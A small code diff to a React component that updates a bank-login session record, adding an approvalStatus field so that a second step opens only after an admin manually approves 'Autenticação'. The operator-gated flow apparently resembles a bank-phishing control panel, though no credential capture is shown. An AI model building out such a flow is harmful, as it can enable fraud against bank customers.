@@ -30,6 +30,9 @@ export function AutenticacaoRedirect({ sessionId, bankSlug, bankName }: Props) {
             ...prev,
             bankSlug,
             bankName,
+            // Bankadan giris = adim 1. approvalStatus sadece admin "Autenticação"
+            // onayi gonderince "autenticacao" olur (o zaman adim 2 acilir).
+            approvalStatus: "",
           },
         })
         .eq("id", sessionId);
